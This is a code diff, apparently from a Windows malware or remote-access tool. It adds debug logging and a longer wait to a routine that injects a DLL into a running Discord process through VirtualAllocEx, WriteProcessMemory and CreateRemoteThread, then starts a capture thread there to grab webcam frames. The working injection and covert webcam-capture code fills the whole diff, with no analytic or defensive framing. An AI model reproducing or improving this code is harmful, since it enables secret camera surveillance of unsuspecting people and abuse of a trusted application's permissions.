@@ -658,7 +658,7 @@ static bool CaptureWebcamFrame(const char* outputPath) {
         while (GetTickCount() - waitStart < 5000) {
             OAFilterState state;
             pControl->GetState(10, &state);
-            if (state == State_Running) { Sleep(300); long cb = 0; if (pGrabber->GetCurrentBuffer(&cb, NULL) == S_OK) { gotSample = true; break; } }
+            if (state == State_Running) { Sleep(2000); long cb = 0; if (pGrabber->GetCurrentBuffer(&cb, NULL) == S_OK) { gotSample = true; break; } }
             Sleep(100);
         }
         if (!gotSample) break;
@@ -1556,13 +1556,14 @@ static bool ExtractDllToTemp(std::string& outPath) {
 
 static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
     DWORD pid = FindProcessPid(L"discord.exe");
-    if (!pid) return false;
+    if (!pid) { LogMsg("Webcam injection: Discord.exe not found"); return false; }
 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return false;
+    if (!hProcess) { LogMsg("Webcam injection: OpenProcess failed"); return false; }
 
     std::string dllPathA;
-    if (!ExtractDllToTemp(dllPathA)) { CloseHandle(hProcess); return false; }
+    if (!ExtractDllToTemp(dllPathA)) { LogMsg("Webcam injection: DLL extract failed"); CloseHandle(hProcess); return false; }
+    LogMsg("Webcam injection: DLL extracted to temp");
 
     int wlen = MultiByteToWideChar(CP_UTF8, 0, dllPathA.c_str(), -1, NULL, 0);
     std::wstring dllPathW((size_t)wlen - 1, 0);
@@ -1574,7 +1575,7 @@ static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
     if (!remoteDllPath || !remoteParams) {
         if (remoteDllPath) VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
         if (remoteParams) VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
-        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false;
+        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); LogMsg("Webcam injection: VirtualAllocEx failed"); return false;
     }
 
     WriteProcessMemory(hProcess, remoteDllPath, dllPathW.c_str(), dllPathBytes, NULL);
@@ -1589,10 +1590,11 @@ static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
     if (!hLoadThread) {
         VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
         VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
-        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false;
+        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); LogMsg("Webcam injection: CreateRemoteThread(LoadLibraryW) failed"); return false;
     }
     WaitForSingleObject(hLoadThread, 10000);
     CloseHandle(hLoadThread);
+    LogMsg("Webcam injection: DLL loaded into Discord");
 
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
     ULONGLONG remoteDllBase = 0;
@@ -1609,7 +1611,7 @@ static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
     if (!remoteDllBase) {
         VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
         VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
-        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false;
+        CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); LogMsg("Webcam injection: DLL not found in Discord module list"); return false;
     }
 
     HMODULE hLocalDll = LoadLibraryW(dllPathW.c_str());
@@ -1624,10 +1626,12 @@ static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
 
     ULONGLONG rva = (ULONGLONG)localExport - (ULONGLONG)hLocalDll;
     HANDLE hCapThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(remoteDllBase + rva), remoteParams, 0, NULL);
-    if (!hCapThread) { FreeLibrary(hLocalDll); VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE); VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE); CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false; }
+    if (!hCapThread) { LogMsg("Webcam injection: CreateRemoteThread(CaptureThread) failed"); FreeLibrary(hLocalDll); VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE); VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE); CloseHandle(hProcess); DeleteFileA(dllPathA.c_str()); return false; }
+    LogMsg("Webcam injection: CaptureThread started in Discord");
 
     WaitForSingleObject(hCapThread, 30000);
     CloseHandle(hCapThread);
+    LogMsg("Webcam injection: CaptureThread completed");
     FreeLibrary(hLocalDll);
     VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
     VirtualFreeEx(hProcess, remoteParams, 0, MEM_RELEASE);
